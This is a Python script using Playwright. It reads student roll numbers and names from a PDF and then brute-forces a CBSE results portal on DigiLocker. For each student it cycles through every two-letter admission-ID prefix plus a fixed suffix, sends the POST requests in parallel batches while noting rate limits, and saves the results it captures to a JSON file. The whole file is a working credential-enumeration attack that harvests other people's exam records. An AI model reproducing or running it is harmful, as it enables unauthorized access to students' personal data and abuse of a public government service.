import asyncio
import json
import os
import re
import pdfplumber
from playwright.async_api import async_playwright

# --- CONFIGURATION ---
PDF_PATH = "PRACTICAL.pdf"
RESULTS_FILE = "results_data.json"

# SKIP LIST: Add roll numbers here that you want to ignore
SKIP_LIST = {"31630990"} 

def get_missing_students_robust():
    """Extracts students using a rolling text buffer, skipping filtered rolls."""
    found_rolls = set()
    if os.path.exists(RESULTS_FILE):
        try:
            with open(RESULTS_FILE, 'r', encoding='utf-8') as f:
                content = f.read()
                found_rolls.update(re.findall(r'"(?:roll|RROLL|roll_no)":\s*"(\d{8})"', content))
        except: pass

    all_students = []
    full_text = ""
    print("📄 Scanning PDF for missing students...")
    with pdfplumber.open(PDF_PATH) as pdf:
        for page in pdf.pages[3:]: 
            page_text = page.extract_text()
            if page_text: full_text += " " + page_text

    matches = re.findall(r'(\d{8})\s+([A-Z\s]{3,25})', full_text)
    for roll, name in matches:
        roll_clean = roll.strip()
        # Only add if not found and not in our skip list
        if roll_clean not in found_rolls and roll_clean not in SKIP_LIST:
            all_students.append({"roll": roll_clean, "name": name.strip()})
    
    unique = {s['roll']: s for s in all_students}.values()
    print(f"✅ Found {len(unique)} students to rescue (Skipped {len(SKIP_LIST)} manual exclusions).")
    return list(unique)

async def main():
    missing_students = get_missing_students_robust()
    if not missing_students: return

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        context = await browser.new_context()
        page = await context.new_page()

        # Terminal feedback filter: Only show custom updates
        page.on("console", lambda msg: print(f"  {msg.text}") if any(e in msg.text for e in ["🔎", "✨", "⏳", "🛑"]) else None)

        async def intercept_response(response):
            if "api/cbse/hscer/results" in response.url and response.status == 200:
                try:
                    data = await response.json()
                    rroll = str(data.get("RROLL"))
                    if data and not data.get("error") and rroll:
                        print(f"\n✨ SUCCESS: Captured {rroll}")
                        await page.evaluate("window.foundSuccess = true")
                        
                        current = []
                        if os.path.exists(RESULTS_FILE):
                            with open(RESULTS_FILE, 'r') as f:
                                try: current = json.load(f)
                                except: pass
                        
                        current.append(data)
                        with open(RESULTS_FILE, 'w') as f:
                            json.dump(current, f, indent=4)
                except: pass

        page.on("response", lambda res: asyncio.create_task(intercept_response(res)))

        for student in missing_students:
            print(f"\n🚀 6-BATCH SCAN: {student['name']} ({student['roll']})")
            await page.goto("https://results.digilocker.gov.in/CBSE12th2026resultXIInruew.html")
            await page.evaluate("window.foundSuccess = false")
            
            suffix = student['roll'][-2:] + "4090" #

            await page.evaluate(f"""async () => {{
                const alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
                const roll = "{student['roll']}";
                const suffix = "{suffix}";
                const alphabetIds = [];

                for (let i = 0; i < 26; i++) {{
                    for (let j = 0; j < 26; j++) {{
                        alphabetIds.push(alpha[i] + alpha[j] + suffix);
                    }}
                }}

                for (let i = 0; i < alphabetIds.length; i += 6) {{
                    if (window.foundSuccess) return;

                    const batch = alphabetIds.slice(i, i + 6);
                    if (i % 60 === 0) console.log("⏳ Section: " + batch[0].slice(0,2));

                    await Promise.all(batch.map(aid => 
                        fetch("https://results.digilocker.gov.in/api/cbse/hscer/results", {{
                            method: "POST",
                            headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
                            body: `rroll=${{roll}}&year=2026&admn_id=${{aid}}`
                        }}).then(res => {{
                            if (res.status === 429) console.log("🛑 RATE LIMITED");
                        }})
                    ));

                    await new Promise(r => setTimeout(r, 120)); 
                }}
            }}""")
            
            await asyncio.sleep(2)

        print("\n🏁 Final Scan Complete.")
        await browser.close()

if __name__ == "__main__":
    asyncio.run(main())